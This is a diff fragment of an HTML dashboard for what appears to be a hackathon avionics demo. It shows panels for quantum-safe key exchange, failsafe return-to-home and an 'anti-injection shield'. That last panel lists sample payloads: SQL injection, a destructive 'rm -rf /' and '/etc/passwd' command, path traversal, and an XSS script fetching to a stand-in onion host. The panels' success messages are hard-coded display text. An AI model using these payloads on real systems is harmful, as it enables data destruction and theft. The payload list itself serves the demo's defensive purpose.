+                                    <button class="btn-fadec nominal" id="btnNegotiateKyber" style="padding:2px 7px; font-size:9.5px;" onclick="negotiateKyberQuantumTunnel()">🔒 Kyber</button>
+                                    <button class="btn-fadec" id="btnTestFipsZeroize" style="padding:2px 7px; font-size:9.5px; border-color:#ffd54f; color:#ffd54f;" onclick="testFipsHardwareZeroize()">💥 Zeroize</button>
+                                </div>
+                            </div>
+                            <div class="sih-feature-desc">
+                                NIST FIPS 203 ML-KEM-768 lattice tunnels + FIPS 140-3 Level 4 hardware core with 38ns key zeroization.
+                            </div>
+
+                            <div id="kyberResultBox" style="background:#030916; border:1px solid rgba(0,212,255,0.25); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;">
+                                <div style="color:#00e676; font-weight:700;">✅ NIST ML-KEM-768 QUANTUM TUNNEL ACTIVE (0.11 ms)</div>
+                                <div style="color:#94a3b8; font-size:9px;">Pubkey: 1,184 B | Ciphertext: 1,088 B | 256-bit AES-GCM Key | Tamper Mesh: ARMED</div>
+                            </div>
+                            <div id="fipsResultBox" style="display:none; background:#030916; border:1px solid rgba(255,213,79,0.3); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;">
+                                <div style="color:#00e676; font-weight:700;">💥 FIPS 140-3 ZEROIZE: 38ns SILICON REGISTER PURGE</div>
+                            </div>
+                        </div>
+
+                        <!-- Pillar 6: Failsafe Autonomous Return-to-Home (RTH) -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="color:#ffd54f; justify-content:space-between;">
+                                <span>Pillar 6: Failsafe Autonomous Return-to-Home (RTH)</span>
+                                <button class="btn-fadec" id="btnTriggerRth" style="padding:3px 9px; font-size:10px; border-color:#00e676; color:#00e676;" onclick="triggerFailsafeRth()">
+                                    🛩️ Engage RTH
+                                </button>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Automatic glide polar trajectory steering to nearest IAF base upon catastrophic propulsion or EW failure.
+                            </div>
+
+                            <div id="rthResultBox" style="background:#030916; border:1px solid rgba(0,230,118,0.3); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;">
+                                <div style="display:flex; justify-content:space-between; align-items:center;">
+                                    <span style="color:#00e676; font-weight:700;">🛩️ RTH STANDBY: NEAREST RUNWAY IDENTIFIED</span>
+                                    <span style="color:#00f0ff;">L/D = 16.03:1</span>
+                                </div>
+                                <div style="color:#cbd5e1; font-size:9.5px; margin-top:2px;">
+                                    Primary Safe Runway: <strong style="color:#ffd54f;">Chitradurga ATR (VECT)</strong> &nbsp;|&nbsp; Distance: 94.0 km &nbsp;|&nbsp; Heading: 124°
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Pillar 7: Multi-Vector Anti-Injection Shield & Parameterized AeroDB -->
+                        <div class="sih-feature-block">
+                            <div class="sih-feature-title" style="color:#ffd54f; justify-content:space-between;">
+                                <span>Pillar 7: Anti-Injection &amp; Parameterized Query Shield</span>
+                                <span class="sec-pill green" style="font-size:9.5px;">eBPF 0.01ms</span>
+                            </div>
+                            <div class="sih-feature-desc">
+                                Intercepts 40+ signatures (SQLi, NoSQLi, RCE, Path Traversal, Rotax CAN-bus fuzzing) with Shannon entropy scoring.
+                            </div>
+
+                            <div style="display:flex; gap:6px; margin-top:4px;">
+                                <select id="injectionPayloadSelect" style="flex:1; background:#020612; border:1px solid rgba(0,212,255,0.3); color:#fff; font-family:var(--font-mono); font-size:9.5px; border-radius:3px; padding:3px 6px;">
+                                    <option value="SQL_UNION">' UNION SELECT * FROM officers WHERE '1'='1</option>
+                                    <option value="RCE_CMD">; powershell -Command rm -rf / ; cat /etc/passwd</option>
+                                    <option value="PATH_TRAVERSAL">../../../../../../windows/system32/cmd.exe</option>
+                                    <option value="CAN_SPOOF">CAN_BUS_FRAME 0x104 (Rotax Invalid Arbitration ID)</option>
+                                    <option value="XSS_SCRIPT">&lt;script&gt;fetch('https://c2-satellite.onion/steal')&lt;/script&gt;</option>
+                                </select>
+                                <button class="btn-fadec" id="btnTestInjectionShield" style="padding:4px 9px; font-size:9.5px; border-color:#00f0ff; color:#00f0ff;" onclick="runAntiInjectionAudit()">
+                                    ⚡ Audit Payload
+                                </button>
+                            </div>
+
+                            <div id="injectionAuditResultBox" style="background:#030916; border:1px solid rgba(0,212,255,0.25); border-radius:5px; padding:6px 10px; font-family:var(--font-mono); font-size:10px; margin-top:4px;">
+                                <div style="color:#00e676; font-weight:700;">🛡️ ANTI-INJECTION SHIELD: READY FOR TELEMETRY AUDIT</div>
+                                <div style="color:#94a3b8; font-size:9px; margin-top:2px;">Select hostile payload above and click 'Audit Payload' to witness real-time kernel interception.</div>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOTE: Officer Profile is hosted on the dedicated full-screen workspace page #page-officer-profile -->
+
+    <!-- JAVASCRIPT CONTROLLERS -->
+    <script src="js/intro_login.js"></script>
+    <script src="js/engine_3d_exploded.js"></script>
+    <script src="js/gauges_avionics.js"></script>
+    <script src="js/tactical_map.js"></script>
+    <script src="js/pages_workspace.js"></script>
+    <script src="js/sih_innovations.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
